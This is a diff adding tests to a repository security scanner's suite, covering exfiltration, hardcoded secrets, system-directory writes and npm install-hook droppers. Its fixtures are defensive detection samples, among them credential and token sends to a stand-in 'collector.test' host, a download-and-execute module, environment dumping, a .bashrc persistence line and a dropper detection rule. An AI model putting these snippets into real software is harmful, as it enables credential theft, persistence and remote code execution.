@@ -1369,7 +1369,7 @@ describe("false positives the per-file cap used to hide", () => {
     expect(result.findings.filter((f) => f.type === "DATA_EXFILTRATION")).toHaveLength(0)
   })
 
-  it("still reports a form field read and sent, and a password field read", async () => {
+  it("still reports a form field read and sent to another host", async () => {
     const sent = await scan({
       "src/steal.js": [
         `const creds = emailInput.value`,
@@ -1379,9 +1379,126 @@ describe("false positives the per-file cap used to hide", () => {
     expect(sent.findings.some((f) => f.type === "DATA_EXFILTRATION")).toBe(true)
 
     const password = await scan({
+      "src/phish.js": [
+        `const p = passwordInput.value`,
+        `navigator.sendBeacon("https://collector.test/p", p)`,
+      ].join("\n"),
+    })
+    expect(password.findings).toContainEqual(
+      expect.objectContaining({
+        type: "DATA_EXFILTRATION",
+        description: expect.stringContaining("Credential Field Transmission"),
+      })
+    )
+
+    // A URL held in a variable may point anywhere.
+    const variable = await scan({
+      "src/phish.js": `const p = passwordInput.value\nfetch(endpoint, { method: "POST", body: p })\n`,
+    })
+    expect(variable.findings.some((f) => f.type === "DATA_EXFILTRATION")).toBe(true)
+  })
+
+  it("does not read a login form or a stored token used on its own origin as exfiltration", async () => {
+    // socket.io's passport-jwt example, reduced: read the password, post it
+    // to the app's own /login, keep the token, send it back to /self.
+    const result = await scan({
+      "examples/passport-jwt-example/index.html": [
+        `<form id="login-form"><input type="password" id="password" /></form>`,
+        `<script>`,
+        `  const passwordInput = document.getElementById('password');`,
+        `  async function main() {`,
+        `    const token = localStorage.getItem('token');`,
+        `    const res = await fetch('/self', { headers: { authorization: \`bearer \${token}\` } });`,
+        `    const socket = io({ extraHeaders: { authorization: \`bearer \${localStorage.getItem('token')}\` } });`,
+        `  }`,
+        `  loginForm.onsubmit = async () => {`,
+        `    const password = passwordInput.value;`,
+        `    const res = await fetch('/login', { method: 'post', body: JSON.stringify({ password }) });`,
+        `    localStorage.setItem('token', (await res.json()).token);`,
+        `  };`,
+        `</script>`,
+      ].join("\n"),
+      "src/dev.js": [
+        `const token = sessionStorage.getItem("auth_token")`,
+        `fetch("http://localhost:3000/me", { headers: { authorization: token } })`,
+      ].join("\n"),
       "src/form.js": `const p = passwordField.value\nstore(p)\n`,
     })
-    expect(password.findings.some((f) => f.type === "DATA_EXFILTRATION")).toBe(true)
+    expect(result.findings.filter((f) => f.type === "DATA_EXFILTRATION")).toHaveLength(0)
+  })
+
+  it("does not read password prompts or placeholders as hardcoded passwords", async () => {
+    const result = await scan({
+      // npm's auth.js: a prompt label, then the next quote two lines down.
+      "lib/auth.js": [
+        `const password = await read.password('Password:', creds.password)`,
+        `const email = await read.email('Email (this will be public):', creds.email)`,
+      ].join("\n"),
+      "examples/server.js": `const pool = new Pool({ user: "postgres", password: "changeit" })\n`,
+      "src/selectors.js": `const pseudo = { checkbox: "[type=checkbox]", password: "[type=password]" }\n`,
+      "src/registry.ts": `export const creds = { username: 'user', password: 'password' }\n`,
+      "src/config.ts": `const keys = { _password: 'authPassword' }\n`,
+    })
+    expect(result.findings.filter((f) => f.type === "HARDCODED_SECRETS")).toHaveLength(0)
+    expect(result.findings.filter((f) => f.type === "INSECURE_CONFIGURATION")).toHaveLength(0)
+  })
+
+  it("does not join a closing quote and the next line's quote into a token value", async () => {
+    // vscode's copilot setup script, which writes a token to a local .env.
+    const result = await scan({
+      "script/setup/getToken.mts": [
+        `const result = raw.split('\\n')`,
+        `  .filter(line => !line.startsWith('GITHUB_OAUTH_TOKEN='))`,
+        `  .concat([\`GITHUB_OAUTH_TOKEN=\${accessToken}\`])`,
+        `  .filter(line => line.trim() !== '')`,
+      ].join("\n"),
+    })
+    expect(result.findings.filter((f) => f.type === "HARDCODED_SECRETS")).toHaveLength(0)
+
+    const real = await scan({ "src/client.js": `const auth_token = "q8Fz2LmN7pRt4VwX9yBc3KdE"\n` })
+    expect(real.findings.some((f) => f.type === "HARDCODED_SECRETS")).toBe(true)
+  })
+
+  it("still reports a real-looking hardcoded password", async () => {
+    const result = await scan({
+      "src/db.js": `const db = connect({ user: "svc", password: "Xk7#mQ2v!9LpR" })\n`,
+    })
+    expect(result.findings).toContainEqual(
+      expect.objectContaining({ type: "HARDCODED_SECRETS", description: expect.stringContaining("Password") })
+    )
+  })
+
+  it("reads the destination of a file write, not the shebang being written", async () => {
+    const result = await scan({
+      "scripts/create-bin-placeholder.mjs": [
+        `fs.writeFileSync(binPath, \`#!/usr/bin/env node\\nconsole.error("build first")\\n\`)`,
+        `fs.writeFileSync(file, \`#!/bin/sh\\nexec pnpm "$@"\\n\`, { mode: 0o755 })`,
+      ].join("\n"),
+    })
+    expect(result.findings.filter((f) => f.type === "SUSPICIOUS_FILE_ACCESS")).toHaveLength(0)
+
+    const system = await scan({
+      "scripts/persist.js": `fs.writeFileSync("/etc/cron.d/update", job)\nfs.appendFileSync(path.join("/usr/local/bin", "x"), s)\n`,
+    })
+    expect(system.findings).toContainEqual(
+      expect.objectContaining({
+        type: "SUSPICIOUS_FILE_ACCESS",
+        description: expect.stringContaining("System Directory Write"),
+      })
+    )
+  })
+
+  it("still reports a stored token sent to another host from a page that also calls its own", async () => {
+    const result = await scan({
+      "src/session.js": [
+        `const token = localStorage.getItem("auth_token")`,
+        `fetch("/self", { headers: { authorization: token } })`,
+        `fetch("https://collector.test/c", { method: "POST", body: token })`,
+      ].join("\n"),
+    })
+    expect(result.findings).toContainEqual(
+      expect.objectContaining({ type: "DATA_EXFILTRATION", severity: "high" })
+    )
   })
 
   it("does not read the English word 'pool' as a crypto miner", async () => {
@@ -1863,5 +1980,99 @@ describe("lifecycle scripts under a test fixture", () => {
       },
     })
     expect(result.findings.some((f) => f.type === "SUSPICIOUS_DEPENDENCY")).toBe(true)
+  })
+})
+
+describe("install hooks scored by what they can do", () => {
+  const DROPPER_RULE: SignatureDatabase = {
+    ...EMPTY_SIGNATURES,
+    yaraRules: [{
+      id: "SUPPLY_CHAIN_PREINSTALL_SETUP_DROPPER",
+      name: "Shai-Hulud style preinstall dropper",
+      pattern: String.raw`"preinstall"\s*:\s*"(?:node|bun)\s+(?:[\w./-]*\/)?(?:setup|setup_bun)\.m?js"`,
+      description: "preinstall: node setup.mjs",
+      tags: [],
+      severity: "critical",
+      confidence: "high",
+      fileExtensions: [".json"],
+      fileNames: ["package.json"]
+    }]
+  }
+  const manifest = `{"name":"@acme/exe","scripts":{"preinstall":"node setup.js"}}`
+
+  async function scanHook(files: Record<string, string>) {
+    global.fetch = mockGitHubApi(files) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: DROPPER_RULE })
+    const hook = result.findings.find((f) => f.pattern === "SUPPLY_CHAIN_PREINSTALL_SETUP_DROPPER")
+    return { result, hook }
+  }
+
+  it("rates a hook that only links a local binary as informational", async () => {
+    // pnpm's @pnpm/exe, reduced: resolve the platform package, hard-link its
+    // binary next to the launcher, rewrite its own package.json.
+    const { result, hook } = await scanHook({
+      "artifacts/exe/package.json": manifest,
+      "artifacts/exe/setup.js": [
+        `import fs from 'fs'`,
+        `import path from 'path'`,
+        `import { platformPkgName } from './platform-pkg-name.js'`,
+        `const pkgJson = fileURLToPath(import.meta.resolve(platformPkgName(process.platform) + '/package.json'))`,
+        `const bin = path.resolve(path.dirname(pkgJson), 'pnpm')`,
+        `fs.linkSync(bin, path.resolve(import.meta.dirname, 'pnpm'))`,
+        `fs.writeFileSync(path.resolve(import.meta.dirname, 'package.json'), '{}')`,
+      ].join("\n"),
+      "artifacts/exe/platform-pkg-name.js": `export const platformPkgName = (p) => '@acme/' + p\n`,
+    })
+    expect(hook).toMatchObject({ severity: "info", cloneBlocking: false })
+    expect(hook!.description).toContain("artifacts/exe/platform-pkg-name.js")
+    expect(result.riskLevel).toBe("low")
+    expect(result.safeToClone).toBe(true)
+  })
+
+  it("keeps it critical when a module the hook imports downloads and executes", async () => {
+    const { result, hook } = await scanHook({
+      "artifacts/exe/package.json": manifest,
+      "artifacts/exe/setup.js": `import { run } from './lib/run'\nrun()\n`,
+      "artifacts/exe/lib/run.js": [
+        `import https from 'node:https'`,
+        `import { execSync } from 'node:child_process'`,
+        `export function run() { https.get(process.argv[2], (r) => r.on('end', () => execSync('bun x.js'))) }`,
+      ].join("\n"),
+    })
+    expect(hook).toMatchObject({ severity: "critical" })
+    expect(hook!.description).toContain("downloads and executes code")
+    expect(result.riskLevel).toBe("high")
+  })
+
+  it("keeps it critical when the hook reads the environment or writes to the home directory", async () => {
+    const env = await scanHook({
+      "package.json": manifest,
+      "setup.js": `const d = JSON.stringify(process.env)\nrequire('fs').writeFileSync('env.json', d)\n`,
+    })
+    expect(env.hook).toMatchObject({ severity: "critical" })
+    expect(env.hook!.description).toContain("reads credentials or the environment")
+
+    const home = await scanHook({
+      "package.json": manifest,
+      "setup.js": `const os = require('os')\nrequire('fs').appendFileSync(os.homedir() + '/.bashrc', 'node ~/.x.js\\n')\n`,
+    })
+    expect(home.hook).toMatchObject({ severity: "critical" })
+    expect(home.hook!.description).toContain("writes outside the project")
+  })
+
+  it("keeps it critical when the script the hook runs is not in the repository", async () => {
+    const { hook, result } = await scanHook({ "package.json": manifest, "src/index.js": "export {}\n" })
+    expect(hook).toMatchObject({ severity: "critical" })
+    expect(hook!.description).toContain("not in the repository")
+    expect(result.riskLevel).toBe("high")
+  })
+
+  it("reads an obfuscated hook script as suspicious", async () => {
+    const { hook } = await scanHook({
+      "package.json": manifest,
+      "setup.js": `const _0x1a2b=['\\x6c\\x6f\\x67'];(function(_0x3c4d){console[_0x1a2b[0]](_0x3c4d)})('x')\n`,
+    })
+    expect(hook).toMatchObject({ severity: "critical" })
+    expect(hook!.description).toContain("is obfuscated")
   })
 })
